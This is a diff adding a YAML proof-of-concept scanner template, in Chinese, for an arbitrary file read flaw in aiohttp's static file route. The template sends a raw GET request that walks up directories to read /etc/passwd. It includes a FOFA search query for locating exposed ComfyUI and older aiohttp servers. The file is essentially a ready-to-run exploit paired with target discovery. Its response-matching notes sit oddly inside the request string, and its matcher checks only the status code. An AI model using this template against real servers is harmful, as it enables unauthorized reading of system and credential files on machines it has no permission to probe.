@@ -1,0 +1,52 @@
+id: poc-zfupwezi0xy1z9x0
+info:
+  name: aiohttp-static-任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/zfupwezi0xy1z9x0'
+  tags: lfi,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: zfupwezi0xy1z9x0
+    fofa: title=="ComfyUI" || (app="AIOHTTP" && server!="aiohttp/3.9.3" && server!="aiohttp/3.9.2")
+http:
+- raw:
+  - 'GET /static/./../../../../../../../../etc/passwd HTTP/1.1
+
+
+    Accept: */*
+
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+
+    Accept-Encoding: gzip, deflate
+
+
+    Connection: close
+
+
+    Pragma: no-cache
+
+
+    Cache-Control: no-cache
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    ^(?=.*?root)(?=.*?bin).*?$
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
